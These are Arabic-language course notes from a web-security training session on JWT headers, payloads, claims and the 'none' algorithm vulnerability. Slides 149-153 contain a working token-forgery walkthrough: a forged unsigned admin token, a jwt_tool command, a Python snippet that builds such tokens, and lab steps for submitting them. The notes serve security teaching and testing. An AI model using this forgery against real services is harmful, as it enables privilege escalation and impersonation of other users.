# الجلسة 10: JWT Claims + ثغرة None Algorithm
## Slides 137 → 153

---

## Slide 137: JWT Header بالتفصيل

> الـ Header هو الجزء الأول من الـ JWT وبيحتوي على **معلومات وصفية** (Metadata) عن الـ Token نفسه.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

| الحقل | المعنى | القيم الشائعة |
|-------|--------|--------------|
| **alg** | خوارزمية التوقيع المستخدمة | `HS256` (HMAC), `RS256` (RSA), `none` |
| **typ** | نوع الـ Token | `JWT` |

- **HS256** (HMAC-SHA256) — خوارزمية متماثلة (Symmetric): نفس المفتاح للتوقيع والتحقق
- **RS256** (RSA-SHA256) — خوارزمية غير متماثلة (Asymmetric): Private Key للتوقيع، Public Key للتحقق

> الـ `alg` field ده بالذات هو اللي هجوم **None Algorithm** بيستغله — هنشوفه بالتفصيل بعد شوية.

---

## Slide 138: JWT Payload بالتفصيل

> الـ Payload هو الجزء التاني من الـ JWT وبيحتوي على الـ **Claims** — المعلومات اللي بتتنقل بين الأطراف.

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true,
  "exp": 1716454560
}
```

**نقطة حرجة:** الـ Payload ده **Base64-encoded** مش **Encrypted**. يعني أي حد عنده الـ Token يقدر يقرأ المحتوى. عشان كده:

| مسموح تحطه في الـ Payload | ممنوع تحطه |
|--------------------------|-----------|
| User ID | الباسورد |
| الاسم | أرقام الكروت |
| الـ Role | بيانات حساسة |
| تاريخ الانتهاء | مفاتيح سرية |

---

## Slide 139: JWT Signature بالتفصيل

> الـ Signature هو الجزء الأخير وبيضمن **سلامة** (Integrity) و**أصالة** (Authenticity) الـ Token.

### كيفية التوليد (مثال HS256):

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### عملية التحقق:

```
1. السيرفر بيستلم الـ JWT
2. بياخد الـ Header والـ Payload
3. بيعيد حساب الـ Signature باستخدام الـ Secret Key
4. بيقارن الـ Signature المحسوبة بالموجودة في الـ Token
5. لو متطابقين → Token صالح
6. لو مختلفين → Token اتعدّل → رفض
```

> لو حد غيّر أي حاجة في الـ Payload (مثلاً `admin: false` → `admin: true`)، الـ Signature مش هتطابق والسيرفر هيرفض الـ Token. **إلا** لو فيه ثغرة — وده اللي هنشوفه.

---

## Slide 140-141: JWT Claims - تعريف

> **Claims** هي أزواج Key-Value في الـ Payload بتحمل معلومات عن المستخدم أو الجلسة. بتتستخدم من التطبيق لمعالجة الـ Token واتخاذ قرارات.

### إيه اللي الـ Claims بتحققه:

| الوظيفة | المثال |
|---------|--------|
| **تقديم سياق** | مين المستخدم ده، إيه إسمه |
| **تحديد صلاحيات** | إيه الـ Role بتاعه، إيه الـ Permissions |
| **دعم منطق التطبيق** | مشاركة بيانات بين Services في نظام موزع |

> الـ Claims **مش مشفرة** بشكل افتراضي (إلا لو بتستخدم JWE - JSON Web Encryption). يعني أي حد يقدر يقرأها لو فكّ الـ Base64.

---

## Slide 142-144: Registered Claims

> **Registered Claims** هي Claims محددة مسبقاً وموحدة بتقدم طريقة Standard لوصف معلومات شائعة.

| الـ Claim | الاسم | الوصف | مثال |
|-----------|-------|-------|------|
| **iss** | Issuer | مين اللي أصدر الـ Token | `"auth.example.com"` |
| **sub** | Subject | مين صاحب الـ Token (عادةً User ID) | `"1234567890"` |
| **aud** | Audience | لمين الـ Token ده موجّه | `"example-app"` |
| **exp** | Expiration Time | امتى الـ Token بينتهي (Unix Timestamp) | `1716546600` |
| **iat** | Issued At | امتى الـ Token اتعمل | `1716543000` |
| **nbf** | Not Before | الـ Token مش صالح قبل الوقت ده | `1716543000` |

```json
{
  "iss": "auth.example.com",
  "sub": "1234567890",
  "aud": "example-app",
  "exp": 1716546600,
  "iat": 1716543000
}
```

> في الـ Pentesting: لو الـ `exp` بعيد أوي (مثلاً سنة)، ده Finding لأن الـ Token بيفضل صالح لفترة طويلة حتى لو المستخدم اتحذف.

---

## Slide 145: Public Claims

> **Public Claims** هي Claims مخصصة بيعرّفها المطور. لازم تكون **فريدة** عشان ما تتعارضش مع Claims تانية.

```json
{
  "role": "admin",
  "email": "user@example.com",
  "permissions": ["read", "write", "delete"]
}
```

> في الـ Pentesting: الـ Claims دي هي الهدف الرئيسي لهجمات **Token Manipulation**. لو قدرت تغيّر `role: "user"` لـ `role: "admin"` وتعدّي الـ Signature → Privilege Escalation.

---

## Slide 146: Private Claims

> **Private Claims** هي Claims مخصصة متفق عليها بين الأطراف المتبادلة للـ JWT. مش Standard ومخصصة للتطبيق.

```json
{
  "department": "sales",
  "cartId": "abc123"
}
```

---

## Slide 147-148: ثغرة None Algorithm

> **None Algorithm Vulnerability** بتحصل لما الـ JWT بيتوقّع بخوارزمية `none` — يعني **بدون توقيع**. ده بيسمح للمهاجم يتلاعب في الـ Token ويتخطى آليات التحقق.

### ليه ده بيحصل أصلاً؟

الـ JWT spec بيسمح بخوارزمية `none` — كانت مصممة **لأغراض الاختبار والتطوير** مش للإنتاج. المشكلة بتحصل لما:

1. **مكتبة JWT مش مظبوطة** — بتقبل `none` كخوارزمية صالحة في الإنتاج
2. **مفيش تحقق من الـ Signature** — التطبيق مش بيتأكد إن الـ Token موقّع فعلاً
3. **ثقة عمياء في الـ Header** — التطبيق بيقرأ الـ `alg` field من الـ Token ويمشي عليه بدون ما يتحقق

---

## Slide 149-151: إزاي الـ None Algorithm بيشتغل

### الخطوات:

#### Step 1: تعديل الـ Header

```json
// قبل (Token عادي):
{"alg": "HS256", "typ": "JWT"}

// بعد (Token ملغوم):
{"alg": "none", "typ": "JWT"}
```

#### Step 2: تعديل الـ Payload

```json
// قبل:
{"sub": "1234567890", "name": "John", "role": "user"}

// بعد:
{"sub": "1234567890", "name": "John", "role": "admin"}
```

#### Step 3: إزالة الـ Signature

```
// Token أصلي (3 أجزاء):
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk

// Token ملغوم (Signature فارغة — لاحظ النقطة الأخيرة بدون حاجة بعدها):
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

#### Step 4: السيرفر بيقبل الـ Token

لأن الـ `alg` بيقول `none`، السيرفر مش بيدور على Signature → بيقرأ الـ Payload ويصدقه.

---

## Slide 152: إزاي بيتم الاستغلال

| الهجوم | الشرح |
|--------|-------|
| **Privilege Escalation** | تغيير `role: "user"` → `role: "admin"` |
| **Impersonation** | تغيير `username` أو `email` لانتحال شخصية مستخدم تاني |
| **Session Hijacking** | تزوير Token بـ Payload مستخدم حقيقي |

### أدوات مفيدة:

```bash
# jwt_tool — أداة Python متخصصة في هجمات JWT
python3 jwt_tool.py <JWT_TOKEN> -X a
# -X a = تجربة None Algorithm Attack تلقائياً

# أو يدوياً — باستخدام Python:
import base64
header = base64.b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
payload = base64.b64encode(b'{"sub":"1","role":"admin"}').decode().rstrip('=')
token = f"{header}.{payload}."
print(token)
```

---

## Slide 153: Lab Demo - None Algorithm Vulnerability

### خطوات الـ Lab:

```
1. سجل دخول بحساب عادي واحصل على الـ JWT
2. فك تشفير الـ JWT (jwt.io أو base64 decode)
3. لاحظ الـ Header والـ Payload
4. غيّر الـ alg في الـ Header لـ "none"
5. غيّر الـ role في الـ Payload لـ "admin"
6. احذف الـ Signature (خلي الجزء التالت فاضي)
7. ابعت الـ Token المعدل في Request جديد
8. لو السيرفر قبله → None Algorithm Vulnerability!
```

---

## ملخص الجلسة العاشرة

| المفهوم | الشرح | التصنيف |
|---------|-------|---------|
| **JWT Header** | Metadata عن الـ Token (alg, typ) | — |
| **JWT Payload** | Claims عن المستخدم (Base64, مش مشفر) | — |
| **JWT Signature** | ضمان سلامة الـ Token | — |
| **Registered Claims** | Claims موحدة (iss, sub, exp, iat) | Standard |
| **Public Claims** | Claims مخصصة (role, email, permissions) | هدف لـ Token Manipulation |
| **Private Claims** | Claims خاصة بين الأطراف | Application-Specific |
| **None Algorithm** | تغيير الـ alg لـ "none" وإزالة الـ Signature | Critical |

> الجلسة الجاية هنتكلم عن **Exposed Claims** وبعدين ندخل في **OAuth** — إيه هو، المكونات بتاعته، الـ Flows، وأشهر الهجمات عليه.
